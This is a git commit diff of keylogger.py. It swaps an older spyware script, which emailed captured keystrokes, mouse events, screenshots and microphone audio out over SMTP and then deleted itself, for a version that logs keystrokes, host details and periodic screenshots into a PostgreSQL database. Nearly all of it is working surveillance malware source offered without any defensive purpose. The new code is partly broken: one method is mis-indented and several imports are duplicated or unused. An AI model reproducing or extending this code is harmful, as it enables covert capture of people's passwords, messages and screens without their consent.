c3022d079a333da34e2196761d9d9e12e6658d3c
suleiman gacheru <dretrevor8@gmail.com>
2024-04-12 20:34:10 +0300

    implement addition captures

--- keylogger.py
+++ keylogger.py
@@ -1,145 +1,110 @@
-try:
-    import logging
-    import os
-    import platform
-    import smtplib
-    import socket
-    import threading
-    import wave
-    import pyscreenshot
-    import sounddevice as sd
-    from pynput import keyboard
-    from pynput.keyboard import Listener
-    from email import encoders
-    from email.mime.base import MIMEBase
-    from email.mime.multipart import MIMEMultipart
-    from email.mime.text import MIMEText
-    import glob
-except ModuleNotFoundError:
-    from subprocess import call
-    modules = ["pyscreenshot","sounddevice","pynput"]
-    call("pip install " + ' '.join(modules), shell=True)
+import base64
+import io
+import zipfile
+import logging
+import psycopg2
+import wave
+import socket
+import platform
+import sounddevice as sd
+import pyscreenshot as screenshot
+import threading
+import pynput.keyboard
+import time
+import platform
+import datetime
+import pyaes
+
+class KeyLogger:
+    def __init__(self, time_interval):
+        self.interval = time_interval
+        self.log = "KeyLogger Started..."
+
+    def appendlog(self, string):
+        self.log = self.log + string
+
+    def system_information(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        plat = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+        self.appendlog(f"\nHostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n")
+
+    def microphone(self, SEND_REPORT_EVERY):
+      fs = 44100  # Define fs as the sampling rate
+    seconds = SEND_REPORT_EVERY
+    obj = wave.open('sound.wav', 'w')
+    obj.setnchannels(1)  # mono
+    obj.setsampwidth(2)
+    obj.setframerate(fs)  # Use fs as the sampling rate
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
+    sd.wait()
+    obj.writeframes(myrecording.tobytes())
+    obj.close()
 
 
-finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
-    SEND_REPORT_EVERY = 60 # as in seconds
-    class KeyLogger:
-        def __init__(self, time_interval, email, password):
-            self.interval = time_interval
-            self.log = "KeyLogger Started..."
-            self.email = email
-            self.password = password
+        
+    def screenshot(self):
+        img = screenshot.grab()
+        # Convert the image to bytes
+        img_bytes = io.BytesIO()
+        img.save(img_bytes, format='PNG')
+        img_bytes.seek(0)
+        # Now you can send img_bytes to the database or perform any other desired operations
+        self.send_to_database(img_bytes)
 
-        def appendlog(self, string):
-            self.log = self.log + string
+    def send_to_database(self, img_bytes):
+        conn = None  # Define conn variable before try-except block
+        cursor = None
+        try:
+            conn = psycopg2.connect(
+                dbname="logs",
+                user="postgres",
+                password="mombasa@2023",
+                host="localhost",
+                port=5432  # Replace with the actual port number
+            )
+            cursor = conn.cursor()
 
-        def on_move(self, x, y):
-            current_move = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_move)
+            # Reset the file pointer to the beginning of img_bytes
+            img_bytes.seek(0)
 
-        def on_click(self, x, y):
-            current_click = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_click)
+            # Insert log message into the database
+            cursor.execute("INSERT INTO logs (timestamp, message, screenshot) VALUES (%s, %s, %s)", (datetime.datetime.now(), self.log, psycopg2.Binary(img_bytes.read())))
+            conn.commit()
 
-        def on_scroll(self, x, y):
-            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_scroll)
+        except (Exception, psycopg2.Error) as error:
+            print("Error while connecting to PostgreSQL:", error)
 
-        def save_data(self, key):
+        finally:
+            # Close database connection
+            if cursor:
+                cursor.close()
+            if conn:
+                conn.close()
+                
+    def run(self):
+        self.system_information()
+        threading.Thread(target=self.capture_screenshots).start()
+        self.capture_keystrokes()
+
+    def capture_screenshots(self):
+        while True:
+            self.screenshot()
+            time.sleep(self.interval)
+
+    def capture_keystrokes(self):
+        def on_press(key):
             try:
-                current_key = str(key.char)
+                self.appendlog(str(key.char))
             except AttributeError:
-                if key == key.space:
-                    current_key = "SPACE"
-                elif key == key.esc:
-                    current_key = "ESC"
-                else:
-                    current_key = " " + str(key) + " "
+                self.appendlog(' [' + str(key) + '] ')
+        
+        with pynput.keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
 
-            self.appendlog(current_key)
+SEND_REPORT_EVERY = 60  # in seconds
 
-        def send_mail(self, email, password, message):
-            sender = "Private Person <from@example.com>"
-            receiver = "A Test User <to@example.com>"
-
-            m = f"""\
-            Subject: main Mailtrap
-            To: {receiver}
-            From: {sender}
-
-            Keylogger by aydinnyunus\n"""
-
-            m += message
-            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(email, password)
-                server.sendmail(sender, receiver, message)
-
-        def report(self):
-            self.send_mail(self.email, self.password, "\n\n" + self.log)
-            self.log = ""
-            timer = threading.Timer(self.interval, self.report)
-            timer.start()
-
-        def system_information(self):
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname)
-            plat = platform.processor()
-            system = platform.system()
-            machine = platform.machine()
-            self.appendlog(hostname)
-            self.appendlog(ip)
-            self.appendlog(plat)
-            self.appendlog(system)
-            self.appendlog(machine)
-
-        def microphone(self):
-            fs = 44100
-            seconds = SEND_REPORT_EVERY
-            obj = wave.open('sound.wav', 'w')
-            obj.setnchannels(1)  # mono
-            obj.setsampwidth(2)
-            obj.setframerate(fs)
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-            obj.writeframesraw(myrecording)
-            sd.wait()
-
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
-
-        def screenshot(self):
-            img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
-
-        def run(self):
-            keyboard_listener = keyboard.Listener(on_press=self.save_data)
-            with keyboard_listener:
-                self.report()
-                keyboard_listener.join()
-            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
-                mouse_listener.join()
-            if os.name == "nt":
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("DEL " + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
-
-            else:
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("rm -rf" + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
-
-    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
-    keylogger.run()
-
-
+keylogger = KeyLogger(SEND_REPORT_EVERY)
+keylogger.run()
